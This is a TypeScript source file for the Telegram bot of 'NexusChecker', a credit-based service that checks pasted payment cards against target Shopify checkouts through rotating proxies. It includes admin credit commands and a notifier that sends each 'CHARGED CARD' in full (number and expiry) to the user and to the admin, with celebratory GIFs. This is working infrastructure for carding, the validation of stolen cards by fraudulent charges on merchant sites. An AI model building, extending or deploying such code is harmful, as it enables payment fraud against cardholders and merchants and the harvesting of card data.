import { storage } from '../storage';
import { ADMIN_TELEGRAM_ID, WS_EVENTS } from '@shared/schema';
import { broadcastToTelegramId } from './wsManager';

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const ADMIN_ID = process.env.TELEGRAM_ADMIN_ID || ADMIN_TELEGRAM_ID;

// Railway automatically injects RAILWAY_PUBLIC_DOMAIN for services with a public network.
// Prefer it in production so the webhook always points at the live deployment URL.
const RAILWAY_PUBLIC_DOMAIN = process.env.RAILWAY_PUBLIC_DOMAIN;
const WEBAPP_URL = RAILWAY_PUBLIC_DOMAIN
  ? `https://${RAILWAY_PUBLIC_DOMAIN}`
  : (process.env.WEBAPP_URL || 'https://chkzz.replit.app');

interface TelegramUpdate {
  update_id: number;
  message?: {
    message_id: number;
    from: {
      id: number;
      is_bot: boolean;
      first_name: string;
      last_name?: string;
      username?: string;
    };
    chat: {
      id: number;
      type: string;
    };
    date: number;
    text?: string;
  };
}

const processedUpdates = new Set<number>();
const MAX_PROCESSED_UPDATES = 1000;
let botInitialized = false;
let webhookSet = false;

function cleanupProcessedUpdates() {
  if (processedUpdates.size > MAX_PROCESSED_UPDATES) {
    const toRemove = processedUpdates.size - MAX_PROCESSED_UPDATES / 2;
    const iterator = processedUpdates.values();
    for (let i = 0; i < toRemove; i++) {
      const val = iterator.next().value;
      if (val !== undefined) {
        processedUpdates.delete(val);
      }
    }
  }
}

export async function handleBotUpdate(update: TelegramUpdate): Promise<void> {
  if (processedUpdates.has(update.update_id)) {
    console.log(`[BOT] Skipping duplicate update: ${update.update_id}`);
    return;
  }

  processedUpdates.add(update.update_id);
  cleanupProcessedUpdates();

  if (!update.message?.text) return;

  try {
    await processMessage(update);
  } catch (error) {
    console.error(`[BOT] Error processing update ${update.update_id}:`, error);
    // Try to let the user know something went wrong instead of silently failing.
    const chatId = update.message?.chat?.id;
    if (chatId) {
      await sendMessage(chatId, 'Something went wrong while processing your request. Please try again.').catch(() => {});
    }
  }
}

async function processMessage(update: TelegramUpdate): Promise<void> {
  const { from, chat } = update.message!;
  const text: string = update.message!.text!;
  const senderId = from.id.toString();
  const isAdmin = senderId === ADMIN_ID;

  console.log(`[BOT] Processing update ${update.update_id}: ${text.substring(0, 20)}... from ${senderId}`);

  if (text.startsWith('/start')) {
    await sendMessageWithButton(chat.id, `
<b>Welcome to NexusChecker</b>

A professional card validation tool using Shopify checkout gateway.

<b>How It Works:</b>
1. Open the app using the button below
2. Add your target Shopify sites
3. Configure proxies for rotation
4. Paste cards and start checking
5. 1 credit = 1 card check

<b>Commands:</b>
/balance - Check your credits
/myid - Get your Telegram ID
${isAdmin ? `
<b>Admin Commands:</b>
/credit [id] [amount] - Add/remove credits
/user [id] - View user details
/broadcast [msg] - Send to all users` : ''}
`, 'Open NexusChecker', WEBAPP_URL);
    return;
  }

  if (text.startsWith('/credit') && isAdmin) {
    const parts = text.split(' ');
    if (parts.length < 3) {
      await sendMessage(chat.id, `
<b>Credit Management</b>

Usage: <code>/credit [user_id] [amount]</code>

Examples:
• <code>/credit 123456789 100</code> - Add 100 credits
• <code>/credit 123456789 -50</code> - Remove 50 credits

The user will be notified of the credit change.
      `);
      return;
    }

    const targetUserId = parts[1];
    const amount = parseInt(parts[2]);

    if (isNaN(amount)) {
      await sendMessage(chat.id, 'Invalid amount. Please enter a number.');
      return;
    }

    // Use getOrCreateUser for idempotent user creation
    const targetUser = await storage.getOrCreateUser({
      telegramId: targetUserId,
      username: null,
      firstName: 'User',
      lastName: null,
      credits: 0,
      totalCharged: 0,
      totalRejected: 0,
      isAdmin: false,
    });

    const updatedUser = await storage.updateUserCredits(targetUserId, amount);
    if (updatedUser) {
      await storage.addCreditTransaction(
        targetUser.id,
        amount,
        amount > 0 ? 'admin_add' : 'admin_remove',
        `${amount > 0 ? 'Added' : 'Removed'} by admin`,
        senderId
      );

      broadcastToTelegramId(targetUserId, { 
        type: WS_EVENTS.CREDITS_UPDATE, 
        payload: { credits: updatedUser.credits } 
      });

      await sendMessage(chat.id, `
<b>Credits Updated</b>

User: <code>${targetUserId}</code>
Change: ${amount > 0 ? '+' : ''}${amount}
New Balance: ${updatedUser.credits} credits
      `);

      if (targetUserId !== senderId) {
        await sendMessage(parseInt(targetUserId), `
<b>Credits ${amount > 0 ? 'Added' : 'Removed'}</b>

Amount: ${amount > 0 ? '+' : ''}${amount}
Balance: ${updatedUser.credits} credits
        `);
      }
    } else {
      await sendMessage(chat.id, 'Failed to update credits.');
    }
    return;
  }

  if (text.startsWith('/user') && isAdmin) {
    const parts = text.split(' ');
    if (parts.length < 2) {
      await sendMessage(chat.id, 'Usage: <code>/user [telegram_id]</code>');
      return;
    }

    const targetUserId = parts[1];
    const targetUser = await storage.getUserByTelegramId(targetUserId);
    
    if (!targetUser) {
      await sendMessage(chat.id, `User <code>${targetUserId}</code> not found.`);
      return;
    }

    await sendMessage(chat.id, `
<b>User Details</b>

ID: <code>${targetUser.telegramId}</code>
Name: ${targetUser.firstName || 'N/A'} ${targetUser.lastName || ''}
Username: @${targetUser.username || 'N/A'}
Credits: ${targetUser.credits}
Approved: ${targetUser.totalCharged}
Declined: ${targetUser.totalRejected}
Admin: ${targetUser.isAdmin ? 'Yes' : 'No'}
    `);
    return;
  }

  if (text.startsWith('/broadcast') && isAdmin) {
    const message = text.replace('/broadcast', '').trim();
    if (!message) {
      await sendMessage(chat.id, 'Usage: <code>/broadcast [message]</code>');
      return;
    }
    await sendMessage(chat.id, 'Broadcast feature coming soon.');
    return;
  }

  if (text.startsWith('/myid')) {
    await sendMessage(chat.id, `
<b>Your Telegram ID</b>
<code>${from.id}</code>

Share this with the admin to receive credits.
    `);
    return;
  }

  if (text.startsWith('/balance')) {
    const user = await storage.getUserByTelegramId(senderId);
    if (user) {
      await sendMessage(chat.id, `
<b>Your Balance</b>

Credits: ${user.credits}
Approved: ${user.totalCharged}
Declined: ${user.totalRejected}
      `);
    } else {
      await sendMessageWithButton(chat.id, 
        'No account found. Open the app to create one.',
        'Open NexusChecker',
        WEBAPP_URL
      );
    }
    return;
  }

  await sendMessageWithButton(chat.id, 
    'Unknown command. Use /start for help.',
    'Open NexusChecker',
    WEBAPP_URL
  );
}

// Anime GIF URLs for card notifications
const ANIME_GIFS = [
  'https://media.giphy.com/media/3o7abKhOpu0NwenH3O/giphy.gif', // Money rain
  'https://media.giphy.com/media/g9582DNuQppxC/giphy.gif', // Excited
  'https://media.giphy.com/media/l0MYGb1LuZ3n7dRnO/giphy.gif', // Celebration
  'https://media.giphy.com/media/3oriO0OEd9QIDdllqo/giphy.gif', // Money
  'https://media.giphy.com/media/l378bu6ZYmzS6nBGo/giphy.gif', // Success
];

// Get card scheme from BIN
function getCardScheme(bin: string): string {
  const firstDigit = bin[0];
  const firstTwo = bin.substring(0, 2);
  const firstFour = bin.substring(0, 4);
  
  if (firstDigit === '4') return 'VISA';
  if (['51', '52', '53', '54', '55'].includes(firstTwo)) return 'MASTERCARD';
  if (parseInt(firstTwo) >= 22 && parseInt(firstTwo) <= 27) return 'MASTERCARD';
  if (['34', '37'].includes(firstTwo)) return 'AMEX';
  if (['6011', '6221', '6229'].some(p => firstFour.startsWith(p)) || firstTwo === '65') return 'DISCOVER';
  if (['3528', '3589'].some(p => parseInt(firstFour) >= parseInt(p.substring(0, 4)) && parseInt(firstFour) <= 3589)) return 'JCB';
  return 'UNKNOWN';
}

// Country emoji flags
const countryFlags: Record<string, string> = {
  'US': '🇺🇸', 'CA': '🇨🇦', 'UK': '🇬🇧', 'GB': '🇬🇧', 'AU': '🇦🇺',
  'DE': '🇩🇪', 'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'NL': '🇳🇱',
  'BE': '🇧🇪', 'AT': '🇦🇹', 'CH': '🇨🇭', 'SE': '🇸🇪', 'NO': '🇳🇴',
  'DK': '🇩🇰', 'FI': '🇫🇮', 'IE': '🇮🇪', 'PT': '🇵🇹', 'PL': '🇵🇱',
  'CZ': '🇨🇿', 'RO': '🇷🇴', 'HU': '🇭🇺', 'GR': '🇬🇷', 'TR': '🇹🇷',
  'RU': '🇷🇺', 'UA': '🇺🇦', 'BR': '🇧🇷', 'MX': '🇲🇽', 'AR': '🇦🇷',
  'CL': '🇨🇱', 'CO': '🇨🇴', 'PE': '🇵🇪', 'VE': '🇻🇪', 'JP': '🇯🇵',
  'CN': '🇨🇳', 'KR': '🇰🇷', 'IN': '🇮🇳', 'ID': '🇮🇩', 'TH': '🇹🇭',
  'VN': '🇻🇳', 'PH': '🇵🇭', 'MY': '🇲🇾', 'SG': '🇸🇬', 'HK': '🇭🇰',
  'TW': '🇹🇼', 'AE': '🇦🇪', 'SA': '🇸🇦', 'IL': '🇮🇱', 'ZA': '🇿🇦',
  'EG': '🇪🇬', 'NG': '🇳🇬', 'KE': '🇰🇪', 'NZ': '🇳🇿',
};

async function sendAnimation(chatId: number | string, animationUrl: string, caption: string): Promise<boolean> {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAnimation`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        animation: animationUrl,
        caption: caption,
        parse_mode: 'HTML'
      })
    });
    const result = await response.json() as { ok: boolean };
    return result.ok;
  } catch (error) {
    console.error('[BOT] Error sending animation:', error);
    return false;
  }
}

export async function sendChargedCardNotification(
  userTelegramId: string, 
  card: string, 
  siteName: string,
  message: string,
  binInfo?: { brand?: string; type?: string; bank?: string; country?: string; countryCode?: string }
): Promise<boolean> {
  if (!BOT_TOKEN) return false;
  
  const cardParts = card.split('|');
  const bin = cardParts[0]?.substring(0, 6) || '';
  const lastFour = cardParts[0]?.slice(-4) || '';
  const expMonth = cardParts[1] || 'XX';
  const expYear = cardParts[2] || 'XX';
  
  // Get card scheme
  const scheme = binInfo?.brand || getCardScheme(bin);
  const cardType = binInfo?.type || 'UNKNOWN';
  const bank = binInfo?.bank || 'Unknown Bank';
  const countryCode = binInfo?.countryCode || 'US';
  const country = binInfo?.country || 'United States';
  const flag = countryFlags[countryCode] || '🌍';
  
  // Random anime GIF
  const gifUrl = ANIME_GIFS[Math.floor(Math.random() * ANIME_GIFS.length)];
  
  const notificationText = `
<b>💳 CHARGED CARD</b>

━━━━━━━━━━━━━━━━━━━━
<b>💎 Card:</b> <code>${card}</code>
━━━━━━━━━━━━━━━━━━━━

<b>📊 BIN Info:</b>
├ <b>Scheme:</b> ${scheme}
├ <b>Type:</b> ${cardType.toUpperCase()}
├ <b>Bank:</b> ${bank}
└ <b>Country:</b> ${flag} ${country}

<b>🌐 Site:</b> ${siteName}
<b>✅ Response:</b> ${message}

━━━━━━━━━━━━━━━━━━━━
<b>⚡ Powered by NexusChecker</b>
  `;
  
  // Send with anime GIF
  const gifSent = await sendAnimation(userTelegramId, gifUrl, notificationText);
  if (!gifSent) {
    // Fallback to text message if GIF fails
    await sendMessage(userTelegramId, notificationText);
  }
  
  // Send to admin too
  if (ADMIN_ID && ADMIN_ID !== userTelegramId) {
    const adminText = `
<b>🔔 NEW CHARGE DETECTED</b>

━━━━━━━━━━━━━━━━━━━━
<b>👤 User ID:</b> <code>${userTelegramId}</code>
<b>💳 Card:</b> <code>${card}</code>
━━━━━━━━━━━━━━━━━━━━

<b>📊 BIN Info:</b>
├ <b>Scheme:</b> ${scheme}
├ <b>Type:</b> ${cardType.toUpperCase()}
├ <b>Bank:</b> ${bank}
└ <b>Country:</b> ${flag} ${country}

<b>🌐 Site:</b> ${siteName}
<b>✅ Response:</b> ${message}
    `;
    await sendAnimation(ADMIN_ID, gifUrl, adminText);
  }
  
  return true;
}

async function sendMessage(chatId: number | string, text: string): Promise<boolean> {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text.trim(),
        parse_mode: 'HTML',
      }),
    });
    return response.ok;
  } catch (error) {
    console.error('Error sending message:', error);
    return false;
  }
}

async function sendMessageWithButton(chatId: number | string, text: string, buttonText: string, url: string): Promise<boolean> {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text.trim(),
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: buttonText,
                web_app: { url }
              }
            ]
          ]
        }
      }),
    });
    return response.ok;
  } catch (error) {
    console.error('Error sending message with button:', error);
    return false;
  }
}

export async function getWebhookInfo(): Promise<any> {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getWebhookInfo`, {
      method: 'GET',
    });
    const result = await response.json();
    return result;
  } catch (error) {
    console.error('[BOT] Error getting webhook info:', error);
    return null;
  }
}

export async function setWebhook(webhookUrl: string, force = false): Promise<boolean> {
  if (webhookSet && !force) {
    console.log('[BOT] Webhook already set, skipping');
    return true;
  }

  console.log(`[BOT] Setting webhook to: ${webhookUrl}`);

  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: webhookUrl,
        drop_pending_updates: true,
        allowed_updates: ['message'],
      }),
    });
    const result = await response.json() as { ok: boolean; description?: string };

    if (!response.ok || !result.ok) {
      console.error('[BOT] Failed to set webhook:', result);
      webhookSet = false;
      return false;
    }

    console.log('[BOT] Webhook set successfully:', result.description || 'OK');
    webhookSet = true;

    // Verify the webhook is actually registered with Telegram
    const info = await getWebhookInfo();
    if (info?.ok) {
      console.log(`[BOT] Webhook verification - URL: ${info.result?.url}, pending updates: ${info.result?.pending_update_count}, last error: ${info.result?.last_error_message || 'none'}`);
    }

    return true;
  } catch (error) {
    console.error('[BOT] Error setting webhook:', error);
    webhookSet = false;
    return false;
  }
}

export async function deleteWebhook(): Promise<boolean> {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ drop_pending_updates: true }),
    });
    const result = await response.json().catch(() => null);
    if (!response.ok) {
      console.error('[BOT] Failed to delete webhook:', result);
    } else {
      console.log('[BOT] Webhook deleted, switching to polling mode');
    }
    webhookSet = false;
    return response.ok;
  } catch (error) {
    console.error('[BOT] Error deleting webhook:', error);
    return false;
  }
}

export async function initBot(): Promise<void> {
  if (!BOT_TOKEN) {
    console.error('[BOT] TELEGRAM_BOT_TOKEN is not set - bot will not be initialized. Set this variable in Railway to enable the bot.');
    return;
  }

  if (botInitialized) {
    console.log('[BOT] Already initialized, skipping');
    return;
  }

  botInitialized = true;

  const isProduction = process.env.NODE_ENV === 'production' || !!process.env.REPL_SLUG || !!RAILWAY_PUBLIC_DOMAIN;
  const hasPublicDomain = !!RAILWAY_PUBLIC_DOMAIN || !!process.env.REPL_SLUG || !!process.env.WEBAPP_URL;

  console.log(`[BOT] Initializing bot - NODE_ENV=${process.env.NODE_ENV || 'undefined'}, RAILWAY_PUBLIC_DOMAIN=${RAILWAY_PUBLIC_DOMAIN || 'not set'}, resolved WEBAPP_URL=${WEBAPP_URL}`);

  if (isProduction && hasPublicDomain) {
    const webhookUrl = `${WEBAPP_URL}/api/telegram/webhook`;
    console.log(`[BOT] Production mode detected - configuring webhook at ${webhookUrl}`);

    let success = await setWebhook(webhookUrl, true);

    // Retry once after a short delay in case of transient network issues on boot
    if (!success) {
      console.warn('[BOT] Initial webhook setup failed, retrying in 5s...');
      await new Promise(resolve => setTimeout(resolve, 5000));
      success = await setWebhook(webhookUrl, true);
    }

    if (success) {
      console.log('[BOT] Bot is ready and listening for webhook updates.');
    } else {
      console.error('[BOT] Could not configure webhook after retry. Falling back to polling so the bot keeps working.');
      await deleteWebhook();
      startPolling();
    }
  } else {
    console.log('[BOT] No public domain detected - using polling (development mode)');
    await deleteWebhook();
    startPolling();
  }
}

let pollingActive = false;
let lastUpdateId = 0;

async function getUpdates(): Promise<TelegramUpdate[]> {
  try {
    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`,
      { method: 'GET' }
    );
    const data = await response.json() as { ok: boolean; result?: TelegramUpdate[] };
    if (data.ok && data.result) {
      return data.result;
    }
    return [];
  } catch (error) {
    console.error('[BOT] Error getting updates:', error);
    return [];
  }
}

function startPolling(): void {
  if (pollingActive) {
    console.log('[BOT] Polling already active');
    return;
  }

  console.log('[BOT] Starting polling...');
  pollingActive = true;
  
  const poll = async () => {
    while (pollingActive) {
      try {
        const updates = await getUpdates();
        for (const update of updates) {
          lastUpdateId = Math.max(lastUpdateId, update.update_id);
          try {
            await handleBotUpdate(update);
          } catch (e) {
            console.error('[BOT] Error handling update:', e);
          }
        }
      } catch (e) {
        console.error('[BOT] Polling error:', e);
        await new Promise(resolve => setTimeout(resolve, 5000));
      }
    }
  };

  poll().catch(console.error);
  console.log('[BOT] Polling started');
}

export function stopPolling(): void {
  pollingActive = false;
  console.log('[BOT] Polling stopped');
}
